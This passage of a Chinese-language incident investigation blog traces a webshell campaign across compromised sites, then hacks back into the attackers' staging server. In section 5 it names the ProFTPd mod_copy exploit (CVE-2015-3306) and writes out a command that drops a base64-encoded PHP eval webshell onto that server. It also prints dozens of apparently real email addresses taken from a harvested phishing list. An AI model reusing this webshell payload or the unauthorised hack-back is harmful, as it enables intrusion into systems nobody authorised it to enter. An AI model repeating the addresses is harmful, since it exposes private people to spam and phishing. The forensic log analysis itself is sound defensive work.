&lt;p&gt;不过我在&lt;code&gt;/tmp&lt;/code&gt;目录下面发现了一个有趣的日志文件。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[/tmp/]$cat w
--2018-11-26 04:49:06--  http://187.85.134.4/cacat/mm.tgz
Connecting to 187.85.134.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 769309 (751K) [application/x-gzip]
Saving to: &#39;mm.tgz&#39;

     0K .......... .......... .......... .......... ..........  6%  174K 4s
    50K .......... .......... .......... .......... .......... 13%  176K 4s
   100K .......... .......... .......... .......... .......... 19% 14.1M 2s
   150K .......... .......... .......... .......... .......... 26%  353K 2s
   200K .......... .......... .......... .......... .......... 33%  353K 2s
   250K .......... .......... .......... .......... .......... 39% 19.8M 1s
   300K .......... .......... .......... .......... .......... 46%  355K 1s
   350K .......... .......... .......... .......... .......... 53% 28.7M 1s
   400K .......... .......... .......... .......... .......... 59% 23.6M 1s
   450K .......... .......... .......... .......... .......... 66%  344K 1s
   500K .......... .......... .......... .......... .......... 73% 18.0M 0s
   550K .......... .......... .......... .......... .......... 79%  360K 0s
   600K .......... .......... .......... .......... .......... 86% 20.4M 0s
   650K .......... .......... .......... .......... .......... 93% 20.2M 0s
   700K .......... .......... .......... .......... .......... 99% 12.7M 0s
   750K .                                                     100% 2438G=1.3s

2018-11-26 04:49:10 (577 KB/s) - &#39;mm.tgz&#39; saved [769309/769309]
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;44-追踪&#34;&gt;&lt;strong&gt;4.4 追踪&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;根据泄露日志，使用谷歌搜索关键字：&lt;code&gt;http://187.85.134.4&lt;/code&gt;，发现了一个历史页面。 &lt;img src=&#34;https://camo.githubusercontent.com/72b4508c7fb8c65f258f07ce9a428c40a5ea65de/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c6d696b76316d667362657a6e62777067713073323969752f323031392d30312d323125323031382d31392d34322545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2019-01-21 18-19-42屏幕截图.png-106.2kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/2a0d252f4361b988ca86d10d1575cc786fdc62df/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f38737969306439747538746731776a7862753062653171772f323031392d30312d323125323031382d32392d33312545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2019-01-21 18-29-31屏幕截图.png-34.3kB&#34;&gt; 这是一个已经被删除的后门页面，刚好被谷歌爬虫收录了，进一步搜索一下这个后门参数的关键字： &lt;code&gt;inurl:bc.php?filesrc=&lt;/code&gt;，得到了多条后门记录。 &lt;img src=&#34;https://camo.githubusercontent.com/5b799f7da5fafc101b822c10bd4d320bc97a82de/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f33706f6f766a6264673330787174736833733576656b30342f323031392d30312d323125323031382d33332d34362545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2019-01-21 18-33-46屏幕截图.png-197.6kB&#34;&gt; 其中多个WebShell缓存页面内容跟上一个被黑网站的临时目录中发现的日志内容吻合，疑似自动化攻击留下的日志，WebShell底部署名：&lt;code&gt;Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber&lt;/code&gt; ，表明后门均为这个黑客组织所有。 &lt;img src=&#34;https://camo.githubusercontent.com/ba131e74e2eb1dd8102e27fd54c721b9eba1aa95/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f36793665327a62786d7966736f6761336633786a376968702f323031382d31322d303325323031302d30312d34362545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2018-12-03 10-01-46屏幕截图.png-194kB&#34;&gt; &lt;strong&gt;进一步搜索这个黑客组织名称，发现大量被黑网站，程序使用Wordpress与Joomla居多。&lt;/strong&gt; &lt;img src=&#34;https://camo.githubusercontent.com/cdaaaa800b84946e1ed5897fa5894af88b9b9e0a/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f74757a366d657375317334656669643969616c7a623339692f413131312e706e67&#34; alt=&#34;A111.png-160.3kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/22876d176eab9819d588f5239e14a8164fd8c017/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c756978346169646d327374693270396964746863756d302f4132322e706e67&#34; alt=&#34;A22.png-9.2kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/855aa4affebde7940b8e2c728eb46d5c3fbf72e8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3266676b7230696f376d34786d6d6e3837333973346b6d372f4133332e706e67&#34; alt=&#34;A33.png-88.2kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/e542c31a4aaa670730efe19aaa132bee9cba6484/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f76306d377a6f38693469636f367466767a347332696371342f4134342e706e67&#34; alt=&#34;A44.png-62.1kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/51c74ea1ef1b9b77c1ab1e5809ed88b1d84946d4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7279726b6f7931696239303473637a6e37346376396f75742f4135352e706e67&#34; alt=&#34;A55.png-56.5kB&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;45-提取日志&#34;&gt;&lt;strong&gt;4.5 提取日志&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;我提取了其中几个被入侵网站的访问日志。&lt;/p&gt;
&lt;h4 id=&#34;451-网站wwwradiolanalhuecl&#34;&gt;&lt;strong&gt;4.5.1 网站：www.radiolanalhue.cl&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;打包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar zcvf /home/radiolanalhue/public_html/www.radiolanalhue.cl.tar.gz
--exclude=/home/radiolanalhue/public_html/www.radiolanalhue.cl.tar.gz  /home/radiolanalhue/public_html/  

tar zcvf /home/radiolanalhue/public_html/www.radiolanalhue.cl.log.tar.gz /home/radiolanalhue/logs/radiolanalhue.cl-ssl_log-Nov-2018.gz /home/radiolanalhue/access-logs/ /home/radiolanalhue/access-logs/radiolanalhue.cl  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget -c http://www.radiolanalhue.cl/www.radiolanalhue.cl.tar.gz 
wget -c http://www.radiolanalhue.cl/www.radiolanalhue.cl.log.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分析&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。


 ✘ ⚡ root@kali  /tmp/radiolanalhue.cl/log/  grep &amp;quot;/beez5/&amp;quot; radiolanalhue.cl-Dec-2018

疑似攻击者代理IP：

212.1.211.3 （美国） - - [30/Nov/2018:13:35:36 -0300] &amp;quot;GET /online/templates/beez5/bc.php HTTP/1.1&amp;quot; 200 16823 &amp;quot;-&amp;quot; &amp;quot;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&amp;quot;


谷歌爬虫：
66.249.66.149 - - [01/Dec/2018:00:53:57 -0300] &amp;quot;GET /online/templates/beez5/bc.php HTTP/1.1&amp;quot; 200 16823 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&amp;quot;

66.249.66.151 - - [01/Dec/2018:06:34:34 -0300] &amp;quot;GET /online/templates/beez5/bc.php?filesrc=https://xeye.io/home/radiolanalhue/public_html/online/templates/beez5/favicon.ico&amp;amp;path=/home/radiolanalhue/public_html/online/templates/beez5 HTTP/1.1&amp;quot; 200 2348 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&amp;quot;

66.249.66.153 - - [01/Dec/2018:06:51:46 -0300] &amp;quot;GET /online/templates/beez5/bc.php?filesrc=https://xeye.io/home/radiolanalhue/public_html/online/templates/beez5/component.php&amp;amp;path=/home/radiolanalhue/public_html/online/templates/beez5 HTTP/1.1&amp;quot; 200 5456 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h4 id=&#34;452-网站zebramediaal&#34;&gt;&lt;strong&gt;4.5.2 网站：zebramedia.al&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;打包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;tar zcvf /home/vayqpdvg/zebramedia.al/zebramedia.al-www.tar.gz --exclude=/home/vayqpdvg/zebramedia.al/zebramedia.al-www.tar.gz /home/vayqpdvg/zebramedia.al/
tar zcvf /home/vayqpdvg/zebramedia.al/zebramedia.al-log.tar.gz /home/vayqpdvg/logs
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget  http://zebramedia.al/zebramedia.al-log.tar.gz
wget  http://zebramedia.al/zebramedia.al-www.tar.gz


-rw-r--r-- 1 1365 1328   478714 11月 30 21:15 evropakrijuese.publik.live-Nov-2018.gz
-rw-r--r-- 1 1365 1328     6463 11月 30 21:15 evropakrijuese.publik.live-ssl_log-Nov-2018.gz
-rw-r--r-- 1 1365 1328  1855430  6月  30  2018 ftp.publik.live-ftp_log-Jun-2018.gz
-rw-r--r-- 1 1365 1328     7899 11月 27 21:12 ftp.publik.live-ftp_log-Nov-2018.gz
-rw-r--r-- 1 1365 1328 22883767 11月 30 21:15 ief.publik.live-Nov-2018.gz
-rw-r--r-- 1 1365 1328    67526 11月 30 21:15 ief.publik.live-ssl_log-Nov-2018.gz
-rw-r--r-- 1 1365 1328    68187 11月 30 21:15 instadyqan.publik.live-Nov-2018.gz
-rw-r--r-- 1 1365 1328    34530 11月 30 21:15 instadyqan.publik.live-ssl_log-Nov-2018.gz
-rw-r--r-- 1 1365 1328    35748 11月 30 21:15 pigmentnews.publik.live-Nov-2018.gz
-rw-r--r-- 1 1365 1328     7709 11月 28 21:15 pigmentnews.publik.live-ssl_log-Nov-2018.gz
-rw-r--r-- 1 1365 1328   129055 11月 30 21:15 publik.live-Nov-2018.gz
-rw-r--r-- 1 1365 1328    14487 11月 30 21:15 publik.live-ssl_log-Nov-2018.gz
-rw-r--r-- 1 1365 1328    88292 11月 30 21:15 zebramedia.publik.live-Nov-2018.gz
-rw-r--r-- 1 1365 1328   139759 11月 30 21:15 zebramedia.publik.live-ssl_log-Nov-2018.gz
-rw-r--r-- 1 1365 1328  6047261 11月 30 21:15 zeri-popullit.publik.live-Nov-2018.gz
-rw-r--r-- 1 1365 1328    52004 11月 30 21:15 zeri-popullit.publik.live-ssl_log-Nov-2018.gz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分析&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。

 ⚡ root@kali  /tmp/zebramedia.al/log/home/vayqpdvg/logs  grep &amp;quot;INSTALL.sql.txt.php&amp;quot; * |grep &amp;quot;php&amp;quot; | awk -F &amp;quot;:&amp;quot; &#39;{print $2}&#39; |awk &#39;{a[$1]+=1;} END {for(i in a){print a[i]&amp;quot; &amp;quot;i;}}&#39; |sort |uniq
 
148    197.211.61.82 (尼日利亚)
8      178.128.221.199 （希腊）


 ⚡ root@kali  /tmp/zebramedia.al/log/home/vayqpdvg/logs  grep &amp;quot;INSTALL.sql.txt.php&amp;quot; * | grep &amp;quot;php&amp;quot; |grep &amp;quot;POST&amp;quot; |awk -F &amp;quot;:&amp;quot; &#39;{print $2 $6}&#39; |sort |uniq
 
178.128.221.199 - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&amp;quot;

197.211.61.82 - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h4 id=&#34;452-网站helioncompositescom&#34;&gt;&lt;strong&gt;4.5.2 网站：helioncomposites.com&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;打包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;日志路径:
/home2/helionco/access-logs/helioncomposites.com/

日志备份:
ls /home2/helionco/logs/
ftp.helioncomposites.com-ftp_log-Feb-2018.gz	
helioncomposites.com-Dec-2018.gz	
helioncomposites.com-Nov-2018.gz	
helioncomposites.com-ssl_log-Dec-2018.gz	
helioncomposites.com-ssl_log-Nov-2018.gz	

tar zcvf /home2/helionco/www/helioncomposites.com-www.tar.gz --exclude=/home2/helionco/www/helioncomposites.com-www.tar.gz  /home2/helionco/www/

tar zcvf /home2/helionco/www/helioncomposites.com-log.tar.gz /home2/helionco/logs/ /home2/helionco/access-logs/helioncomposites.com/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget  http://helioncomposites.com/helioncomposites.com-log.tar.gz
wget  http://helioncomposites.com/helioncomposites.com-www.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;分析&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。

 ⚡ root@kali  /tmp  grep &amp;quot;.php&amp;quot; * |grep &amp;quot;/home2/helionco/public_html/&amp;quot; |grep  &amp;quot;HTTP\/1.1\&amp;quot; 200&amp;quot; |awk -F &amp;quot;:&amp;quot; &#39;{print $2}&#39; |awk &#39;{a[$1]+=1;} END {for(i in a){print a[i]&amp;quot; &amp;quot;i;}}&#39; |sort -t &amp;quot; &amp;quot; -k 1 -n -r &amp;gt;ip.txt
 
1137 198.143.51.17
588 198.143.38.3
478 198.143.41.14
246 198.143.32.13
131 198.143.32.3
103 198.143.57.3
86 198.143.57.73
84 198.143.57.5
46 198.143.32.10
32 198.143.37.15
......
 
 ⚡ root@kali  /tmp  for line in $(&amp;lt;/ip.txt); do curl https://ip.cn/\?ip\=$line ; done
 
IP: 198.143.51.17 来自: 以色列 Incapsula
IP: 198.143.38.3 来自: 美国 Incapsula
IP: 198.143.41.14 来自: 美国 Incapsula
IP: 198.143.32.13 来自: 美国 Incapsula
IP: 198.143.32.3 来自: 美国 Incapsula
IP: 198.143.57.3 来自: 美国 Incapsula
IP: 198.143.57.73 来自: 美国 Incapsula
IP: 198.143.57.5 来自: 美国 Incapsula
IP: 198.143.32.10 来自: 美国 Incapsula
......
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;这个网站由于日志不全，提取出的IP大都是爬虫IP，所以不纳入最终的汇总。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h4 id=&#34;453-发现钓鱼程序&#34;&gt;&lt;strong&gt;4.5.3 发现钓鱼程序&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;网站　&lt;code&gt;zebramedia.al&lt;/code&gt;　上发现多个攻击者放置的钓鱼程序和模板。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;针对Dropbox&lt;/strong&gt; &lt;img src=&#34;https://camo.githubusercontent.com/b2802f35b646236deec64910ac3b822d4cbc6fdd/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c3335797435306571326a347639673376696c64353836682f323031382d31322d303125323030302d33322d30332545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2018-12-01 00-32-03屏幕截图.png-116.9kB&#34;&gt; &lt;strong&gt;针对Gmail&lt;/strong&gt; &lt;img src=&#34;https://camo.githubusercontent.com/6e9909855f693fd4d73f35935f55f6fc925bf255/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f62326c6b7974386378656468726c327a37316e31336b646f2f323031382d31322d303125323030302d32382d35312545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2018-12-01 00-28-51屏幕截图.png-76.2kB&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;46-关联分析&#34;&gt;&lt;strong&gt;4.6 关联分析&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;使用之前得到的后门文件中的关键字（&lt;code&gt;config.php&lt;/code&gt;）对这3个网站文件进行匹配，发现其中2个存在相同后门文件，并且文件MD5值相同。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ⚡ root@kali  /tmp  find . -name &amp;quot;*.php&amp;quot; |xargs grep  &amp;quot;\$bm_____s&amp;quot; |awk -F &amp;quot;:&amp;quot; &#39;{print $1}&#39; 
 
./rosturplast.com/www/rosturplast.com/shells/config.php
./mirohaviar.sk/www/config.php
./zebramedia.al/www/zebramedia.al/config.php
./www.radiolanalhue.cl/www/public_html/online/administrator/templates/bluestork/config.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;后门文件MD5&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ⚡ root@kali  /tmp  find . -name &amp;quot;*.php&amp;quot; |xargs grep  &amp;quot;\$bm_____s&amp;quot; |awk -F &amp;quot;:&amp;quot; &#39;{print $1}&#39; |xargs md5sum
 
e5c06f1f66781ba5c39d909096c4cd47  ./rosturplast.com/www/rosturplast.com/shells/config.php
e5c06f1f66781ba5c39d909096c4cd47  ./mirohaviar.sk/www/config.php
e5c06f1f66781ba5c39d909096c4cd47  ./zebramedia.al/www/zebramedia.al/config.php
e5c06f1f66781ba5c39d909096c4cd47  ./www.radiolanalhue.cl/www/public_html/online/administrator/templates/bluestork/config.php
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;五渗透攻击者傀儡服务器&#34;&gt;五、渗透攻击者傀儡服务器&lt;/h2&gt;
&lt;h3 id=&#34;51-漏洞扫描&#34;&gt;&lt;strong&gt;5.1 漏洞扫描&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;目标：187.85.134.4&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[+] HOST: 187.85.134.4（巴西） [+] OS: Ubuntu [+] Web Server: Apache/2.2.22 / PHP/5.3.10-1ubuntu3.19 [+] CMS: 未知&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;nmap --script=firewalk --traceroute 187.85.134.4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/cfe2ab2646f73e2d3367878c516656466b1e9a93/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f367262357271366a61736135346c7864616877746e3766352f3138372e38352e3133342e342d6e6d61702e706e67&#34; alt=&#34;187.85.134.4-nmap.png-172.2kB&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;5２-漏洞利用&#34;&gt;&lt;strong&gt;5.２ 漏洞利用&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;端口扫描发现目标 FTP Server为&lt;code&gt;ProFTPd 1.3.4a&lt;/code&gt;，这个版本和&lt;code&gt;1.3.5&lt;/code&gt;存在未授权文件复制漏洞，我们可以通过这个漏洞往Web目录写入一个WebShell。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ProFTPd 1.3.5 Remote Command Execution（CVE-2015-3306） 
ProFTPD中使用的mod_copy模块存在未授权访问风险，导致ProFTPD自带的命令 SITE CPFR 和 SITE CPTO可在未登录ftp的情况被外部黑客所利用，对系统文件进行任意复制。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/e9c06b257b04ae1abb6e772fd260bebb371cd003/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e7574716a6f6b636a32306a33773835306e6732736331612f50726f46545064253230312e332e352d612e706e67&#34; alt=&#34;ProFTPd 1.3.5-a.png-84.8kB&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;5２-获取权限&#34;&gt;&lt;strong&gt;5.２ 获取权限&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;使用用MSF执行 &lt;img src=&#34;https://camo.githubusercontent.com/66530e49ceba7ca2ea5618ee552c06407a678e8c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6f6b633962346e6e656d78616633793070736976776d347a2f6d73662d70726f667470645f6d6f64636f70795f657865632e706e67&#34; alt=&#34;msf-proftpd_modcopy_exec.png-405kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到一个cmd功能的WebShell &lt;img src=&#34;https://camo.githubusercontent.com/02fb9193416fa91c8339ca21987ff0be2b33b472/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f38707134796a6c6939327775706374616a34716e6a326c7a2f323031382d31322d303325323032312d35302d31322545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2018-12-03 21-50-12屏幕截图.png-190.9kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;写入中国菜刀客户端&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://187.85.134.4/lndex.php?img=echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+Cg== |base64 -d  &amp;gt;/var/www/index2.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/9095b45319d122fc51b5db5a38352c7f6aacc2b4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3731733668306f737575383034773130776261326375656d2f323031382d31322d303525323031392d32382d35332545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2018-12-05 19-28-53屏幕截图.png-201.6kB&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;53-文件分析&#34;&gt;&lt;strong&gt;5.3 文件分析&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;在Web目录下面发现用于发送钓鱼邮件的perl脚本、邮件钓鱼样本和大量的邮箱地址。以及挖矿后门、DDOS脚本等。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/c07e889f89f27482ddd65c8c63fa24001c4c1cb4/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a666467786968746f30336d7963303635736f35783231312f3138372e38352e3133342e342d6c732e706e67&#34; alt=&#34;187.85.134.4-ls.png-473kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/6fc5503b71aae7bfb481ecd6662fbd1e28f3f2da/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3775666c706f70663373646d797966706476676c6e366c6d2f3138372e38352e3133342e342d6c736c732e706e67&#34; alt=&#34;187.85.134.4-lsls.png-390.5kB&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;531-钓鱼模板&#34;&gt;&lt;strong&gt;5.3.1 钓鱼模板&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;图示是针对丹麦丹斯克银行（Danske Bank）和希腊阿尔法银行（Alpha Bank）的邮件钓鱼样本。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/446514e6f12cb512b8058074a93d8e1eef77f855/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6e6b716461613675667a736235396d777334753368347a6f2f254539253932253933254539254231254243254536254138254131254536253944254246312e706e67&#34; alt=&#34;钓鱼模板1.png-50.5kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/0a53b7baf724dbee27b57afbbca28aaae2179610/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f736e6b35327130716534366379796d736c767a65627864322f254539253933254236254538254131253843254536254138254131254536253944254246322e706e67&#34; alt=&#34;银行模板2.png-79.3kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/fc84dd8c3dc2f3b25e73d696b5531706df96e6cf/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6c78347a6877396a767973776369397a756f716f726671772f254539253933254236254538254131253843254536254138254131254536253944254246332e706e67&#34; alt=&#34;银行模板3.png-37.5kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/8266b46ffdb8bec642510f7033deb0695c902c3c/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f743174776337727279786c64343676717477346d307430772f254539253933254236254538254131253843254536254138254131254536253944254246342e706e67&#34; alt=&#34;银行模板4.png-40.4kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/e671c05a8c7907573573d13f8e542d261918ef37/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6f327477376970713730637130747a6964616b637871757a2f254539253933254236254538254131253843254536254138254131254536253944254246352e706e67&#34; alt=&#34;银行模板5.png-24.7kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/c2ce1b0f1de81627cc07af1e2121f38043066203/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3338746c383339356861786b3064713978386770307830372f254539253933254236254538254131253843254536254138254131254536253944254246362e706e67&#34; alt=&#34;银行模板6.png-36.1kB&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;532-僵尸网络程序&#34;&gt;&lt;strong&gt;5.3.2 僵尸网络程序&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/9b1faa497d52db708115599dad034472424be088/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6230683467666f62336a316e6b33763871703237676762692f697263332e706e67&#34; alt=&#34;irc3.png-9.9kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/0ca5bb2da1376ce7992dee0bb897387fbc8246bb/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f686d373171627569336734316e6e65686b747231703167742f697263322e706e67&#34; alt=&#34;irc2.png-99.8kB&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;533-ddos脚本&#34;&gt;&lt;strong&gt;5.3.3 DDOS脚本&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/3cd055ccd3e0634cd8b939b5ee75e908c7a936bd/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f623938726e6f30306a7563646f6f3476313031776774656c2f64646f73322e706e67&#34; alt=&#34;ddos2.png-75kB&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;534-邮箱地址&#34;&gt;&lt;strong&gt;5.3.4 邮箱地址&lt;/strong&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;统计目录下的 txt 文本数量，发现共有六十二万四千个邮箱地址。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt; ⚡ root@kali  /tmp/187.85.134.4/www/cat  wc -l *.txt     

624000 总用量
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;主流邮箱检索&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ⚡ root@kali  /tmp/187.85.134.4/www/cacat  grep &amp;quot;@gmail.com&amp;quot; *.txt |head -n 20 

a0000001.txt:a.l.v.e.rtadsmileyksso@gmail.com
a0000001.txt:a.l.v.ertadsmileyksso@gmail.com
a0000001.txt:a.lfer.gm@gmail.com
a0000001.txt:a.lieseijsink@gmail.com
a0000001.txt:a.linkhusen@gmail.com
a0000001.txt:a.loldrup@gmail.com
a0000001.txt:a.lovendahl@gmail.com
a0000001.txt:a.lv.e.rtadsmileyksso@gmail.com
a0000001.txt:a.lver.tadsmileyksso@gmail.com
a0000001.txt:a.m.edsberg@gmail.com
a0000001.txt:a.m.morcke@gmail.com
a0000001.txt:a.m.quist@gmail.com
a0000001.txt:a.m.svendsen@gmail.com
a0000001.txt:a.merete.p@gmail.com
a0000001.txt:a.mette.sm@gmail.com
a0000001.txt:a.miller8111@gmail.com
a0000001.txt:a.moejbaek@gmail.com
a0000001.txt:a.moltkehansen@gmail.com
a0000001.txt:a.munktved@gmail.com
a0000001.txt:a.n.knutzen@gmail.com
 ⚡ root@kali  /tmp/187.85.134.4/www/cat  grep &amp;quot;@outlook.com&amp;quot; *.txt |head -n 20

a0000001.txt:a.m.westra@outlook.com
a0000001.txt:a.olsen@outlook.com
a0000002.txt:aagren@outlook.com
a0000003.txt:aandanimalcity@outlook.com
a0000003.txt:aarhus-ungegruppe@outlook.com
a0000004.txt:aase.lousdal@outlook.com
a0000006.txt:abroschultz@outlook.com
a0000008.txt:adamfred2@outlook.com
a0000008.txt:adexecsolution@outlook.com
a0000010.txt:adrian.f.a.svendsen@outlook.com
a0000015.txt:aiah@outlook.com
a0000015.txt:aimeegarcia584@outlook.com
a0000016.txt:ajolicoeu@outlook.com
a0000018.txt:akstrup@outlook.com
a0000020.txt:alexander_bangsborg@outlook.com
